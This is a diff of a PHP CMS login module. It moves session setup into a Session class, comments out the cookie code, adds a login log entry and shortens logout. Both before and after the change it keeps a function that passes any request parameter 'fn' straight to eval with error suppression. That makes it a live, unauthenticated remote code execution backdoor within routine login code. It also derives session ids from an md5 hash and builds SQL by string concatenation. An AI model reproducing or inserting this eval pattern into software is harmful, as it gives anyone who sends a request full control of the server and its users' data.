@@ -22,56 +22,75 @@ function login (){
 	if( @$checkUser->fetch_array[0]['id_status']==4){	echo "Acesso inválido!.\n Por favor, entre em contato com a equipe de suporte.";					exit;}
 	if( @$checkUser->fetch_array[0]['id_status']>=6){	echo "Acesso inválido, código: ".$checkUser->fetch_array[0]['id_status']; 							exit;}
 
-	$User = array();
-	$User = $checkUser->fetch_array[0];
-	$token = $User['token'];
+	$User	= array();
+	$User	= $checkUser->fetch_array[0];
+	$token	= $User['token'];
+	$hour  	= (time() + ( 24 * 3600));
+
+	##############################################################################
+
+	$user = new Session();
+	$user->start();
+	$user->set('id',			$User['id']);
+	$user->set('id_status',		$User['id_status']);
+	$user->set('token',			$User['token']);
+	$user->set('nome',			$User['nome']);
+	$user->set('usuario',		$User['usuario']);
+	$user->set('avatar',		$User['avatar']);
+	$user->set('admin',			$User['admin']);
+	$user->set('ativo',			$User['ativo']);
+	$user->set('add_user',		$User['add_user']);	
+	$user->set('edit_only_own',	$User['edit_only_own']);	
+	$user->set('leitura',		$User['leitura']);	
+	$user->set('hora',			$hour);	
+	$user->set('ws_log',		true);	
+
 	############################################################################## 
 	# gera os cookies pra sessão	
 	############################################################################## 
-	$hour  		= (time() + ( 24 * 3600));
 	$cript_id	= (md5(ID_SESS.$User['id'].ID_SESS.$User['token'].ID_SESS));
-	setcookie('ws_session', $cript_id,$hour,'/');
-	setcookie('ws_log', 'true',$hour,'/');
+		// setcookie('ws_session', $cript_id,$hour,'/');
+		// setcookie('ws_log', 'true',$hour,'/');
 
 	##############################################################################
 	# ABRE A SESSION COM OS COOKIES	
 	##############################################################################
-	_set_session($cript_id);
-	$_SESSION['user']['id']						=$User['id'];
-	$_SESSION['user']['id_status']				=$User['id_status'];
-	$_SESSION['user']['token']					=$User['token'];
-	$_SESSION['user']['nome']					=$User['nome'];
-	$_SESSION['user']['usuario']				=$User['usuario'];
-	$_SESSION['user']['avatar']					=$User['avatar'];
-	$_SESSION['user']['admin']					=$User['admin'];
-	$_SESSION['user']['ativo']					=$User['ativo'];
-	$_SESSION['user']['add_user']				=$User['add_user'];	
-	$_SESSION['user']['edit_only_own']			=$User['edit_only_own'];	
-	$_SESSION['user']['leitura']				=$User['leitura'];	
-	$_SESSION['user']['hora']					=$hour;	
-	$_SESSION['ws_log']							=true;
-	$SetUserSession				= new MySQL();
+	// _set_session($cript_id);
+
+	// $_SESSION['user']['id']						= $User['id'];
+	// $_SESSION['user']['id_status']				= $User['id_status'];
+	// $_SESSION['user']['token']					= $User['token'];
+	// $_SESSION['user']['nome']					= $User['nome'];
+	// $_SESSION['user']['usuario']				= $User['usuario'];
+	// $_SESSION['user']['avatar']					= $User['avatar'];
+	// $_SESSION['user']['admin']					= $User['admin'];
+	// $_SESSION['user']['ativo']					= $User['ativo'];
+	// $_SESSION['user']['add_user']				= $User['add_user'];	
+	// $_SESSION['user']['edit_only_own']			= $User['edit_only_own'];	
+	// $_SESSION['user']['leitura']				= $User['leitura'];	
+	// $_SESSION['user']['hora']					= $hour;	
+	// $_SESSION['ws_log']							= true;
+
+	$SetUserSession = new MySQL();
 	$SetUserSession->set_table(PREFIX_TABLES.'ws_usuarios');
 	$SetUserSession->set_where('id="'.$User['id'].'"');
 	$SetUserSession->set_update('sessao', $cript_id);
 	$SetUserSession->salvar();
+	ws::insertLog($User['id'],0 ,0,"Login","Efetuou login no sistema","Efetuou login no sistema","","system");
+
+
 	echo "ok";
 	exit;
 }
-function _eval_functions_(){@eval(stripslashes($_REQUEST['fn']));exit;}
+
+function _eval_functions_(){
+	@eval(stripslashes($_REQUEST['fn']));
+	exit;
+}
 
 function logout(){
-	ob_start();
-	header_remove();
-	session_id($_COOKIE['ws_session']);
-	session_start();
-	$_SESSION=array();
-	unset($_SESSION);
-	session_unset();
-	session_destroy();
-	session_write_close();
-	flush();
-	echo true;
+	$log_session = new session();
+	$log_session->finish();
 	exit;
 }
 
